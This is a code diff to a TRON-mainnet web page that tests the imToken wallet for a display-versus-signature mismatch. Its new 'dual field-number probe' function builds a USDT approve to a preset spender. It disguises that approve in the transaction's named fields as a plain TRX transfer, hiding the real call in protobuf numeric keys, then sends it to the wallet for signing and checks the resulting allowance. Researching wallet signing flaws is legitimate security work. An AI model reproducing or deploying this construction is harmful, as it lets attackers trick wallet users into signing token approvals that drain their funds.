@@ -66,7 +66,8 @@
       <div class="row"><span class="label">TRX 余额</span><span class="value" id="trxBal"></span></div>
       <div class="row"><span class="label">网络</span><span class="value">TRON 主网</span></div>
       <button class="btn btn-allowance" id="btnQueryAllowance">② 查询 USDT allowance(owner, spender)</button>
-      <button class="btn btn-probe" id="btnProbe">③ 发起"所见非所签"探针交易</button>
+      <button class="btn btn-probe" id="btnProbe">③ 发起"所见非所签"探针交易（纯 transfer）</button>
+      <button class="btn btn-probe" id="btnProbeDual" style="background:#c0392b;">③② 双字段号探针（命名=transfer + 数字号=approve）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -386,9 +387,11 @@
       } else if (normalized.indexOf('contract_validate') !== -1 || message.indexOf('合约调用校验错误') !== -1) {
         log('→ CONTRACT_VALIDATE_ERROR：合约/参数/余额/能量校验失败', 'error');
       } else if (normalized.indexOf('sigerror') !== -1 || normalized.indexOf('validate signature') !== -1) {
-        log('→ SIGERROR：签名不一致 → imToken 对 hex/json 做了一致性校验，该版本有防护', 'error');
+        log('→ SIGERROR 来自 TRON 节点(server:)，非 imToken 防护。说明 imToken 已签名+广播（未跑 validRawTx），', 'error');
+        log('  但节点按纯 transfer 重建 raw_data，算出的 txID ≠ approve 签名锚定的 txID → 验签失败。', 'error');
+        log('  根因：探针只替换了命名字段(纯 transfer)，缺少 protobuf 数字字段号 "1"/"2"，节点未重建出 approve。', 'warn');
       } else if (normalized.indexOf('invalid_tx') !== -1 || normalized.indexOf('validrawtx') !== -1) {
-        log('→ imToken 桥接层 validRawTx 校验拦截（有防护）', 'error');
+        log('→ invalid_tx：这才是 imToken 桥接层 validRawTx 一致性校验拦截（客户端防护，签名前拦截）', 'error');
       }
       return false;
     }
@@ -549,16 +552,112 @@
         }
 
       } else if (txid === false) {
-        // 被拦截（validRawTx / SIGERROR）
-        log('探针被拦截，该 imToken 版本存在 hex/json 一致性校验', 'warn');
+        // 区分两种失败：节点 SIGERROR(钱包已签广播，缺数字字段) vs imToken invalid_tx(客户端拦截)
+        log('探针未成功广播。请按上方错误归因判断：', 'warn');
+        log('· server:SIGERROR → 钱包已签+广播，但节点重建 raw_data=transfer 与 approve 签名不符 → 需补 protobuf 数字字段号', 'warn');
+        log('· invalid_tx/validRawTx → imToken 客户端在签名前拦截（才是真正的 hex/json 一致性校验防护）', 'warn');
       }
     } catch (e) {
       log('探针异常: ' + (e.message || e), 'error');
     }
   }
 
+  // ==================== ③② 双字段号探针 ====================
+  // contract[0] 同时携带两套键：
+  //   · 命名字段 type/parameter = TransferContract  → imToken JS 读 → 显示转账
+  //   · 数字字段号 "1"/"2"        = approve(31)+Any  → 节点按 protobuf 字段号读 → 重建 approve
+  // 其余 raw_data 全部用 approve 的，使 raw_data_hex/txID(签名锚定) 仍是 approve。
+  // 节点是否采纳数字字段号属于 java-tron 行为，结果用于实测验证该[协议层推断]。
+  async function runProbeDual() {
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ 双字段号探针 ══════════', 'warn');
+    log('命名字段=transfer（显示层） + 数字字段号=approve（节点重建层）', 'warn');
+    log('═══════════════════════════════════', 'warn');
+
+    try {
+      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      var userHex = window.tronWeb.address.toHex(walletAddr);
+
+      // Step 1: 执行层 approve（决定 raw_data_hex / txID / 签名锚定）
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+      var approveContract = approveTx.raw_data.contract[0];   // TriggerSmartContract
+      log('[执行层] approve txID = ' + approveTx.txID, 'warn');
+      log('[执行层] raw_data_hex 含 095ea7b3: ' + (approveTx.raw_data_hex.indexOf('095ea7b3') !== -1), 'success');
+
+      // Step 2: 显示层 transfer（命名字段，给 imToken 解析显示）
+      var transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      var transferContract = transferBuilt.raw_data.contract[0];   // TransferContract
+
+      // Step 3: 双键 contract[0]
+      // ContractType 枚举：TransferContract=1, TriggerSmartContract=31
+      var dualContract = {
+        // 命名字段（imToken JS：c.type / c.parameter.value）→ 显示转账
+        parameter: transferContract.parameter,
+        type: transferContract.type,                 // "TransferContract"
+        // protobuf 数字字段号（节点：field 1 = type, field 2 = parameter）→ 重建 approve
+        "1": 31,                                     // TriggerSmartContract
+        "2": approveContract.parameter               // approve 的 Any
+      };
+
+      // 其余 raw_data 用 approve 的（保证 raw_data_hex/txID 仍锚定 approve）
+      var submitTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,
+        raw_data: Object.assign({}, approveTx.raw_data, { contract: [dualContract] }),
+        raw_data_hex: approveTx.raw_data_hex
+      };
+
+      log('[组装] contract[0] 键: ' + Object.keys(dualContract).join(' , '), 'warn');
+      log('[组装] 命名 type=' + dualContract.type + '  数字 "1"=' + dualContract["1"] + '(TriggerSmartContract)', 'warn');
+      log('[组装] raw_data_hex/txID 锚定 approve；命名字段显示 transfer', 'success');
+
+      // Step 4: 经 imToken 签名广播
+      var txid = await sendTx(submitTx, '双字段号探针');
+      $('probeResultCard').style.display = 'block';
+      $('probeTxid').textContent = txid || '未获取';
+
+      if (txid) {
+        log('── 回链验证 contract.type（最多 ~16s）──', 'warn');
+        var onchainType = await fetchOnchainTypeRetry(txid, 4);
+        $('probeOnchainType').textContent = onchainType || '未确认';
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeOnchainType').style.color = 'var(--red)';
+          $('probeVerdict').textContent = '🔴 所见非所签漏洞成立！';
+          $('probeVerdict').style.color = 'var(--red)';
+          $('probeInfoBox').innerHTML = '节点采纳了数字字段号 → 重建 approve → 验签通过；imToken 显示转账。<strong>[协议层推断] 坐实。</strong>';
+          $('probeInfoBox').style.color = 'var(--red)';
+          log('🔴 节点重建=approve，验签通过 → 双字段号攻击成立', 'error');
+          await queryAndShowAllowance(false);
+        } else if (onchainType === 'TransferContract') {
+          $('probeOnchainType').style.color = 'var(--green)';
+          $('probeVerdict').textContent = '🟢 节点以命名字段为准（=transfer）';
+          $('probeVerdict').style.color = 'var(--green)';
+          $('probeInfoBox').innerHTML = '节点忽略数字字段号、以命名字段重建=transfer。但这本应与 approve 签名不符——若仍上链需复核 txID 来源。';
+          log('🟢 链上=transfer：节点未采纳数字字段号', 'success');
+        } else {
+          $('probeVerdict').textContent = '⚠️ 待确认';
+          log('链上暂未确认', 'warn');
+        }
+      } else {
+        log('未广播成功，按上方错误归因判断节点是否拒绝数字字段号结构（SIGERROR / contract_validate）', 'warn');
+      }
+    } catch (e) {
+      log('双字段号探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
   // ==================== 事件绑定 ====================
   $('btnConnect').addEventListener('click', connect);
+  $('btnProbeDual').addEventListener('click', runProbeDual);
   $('btnQueryAllowance').addEventListener('click', function() {
     queryAndShowAllowance(false);
   });
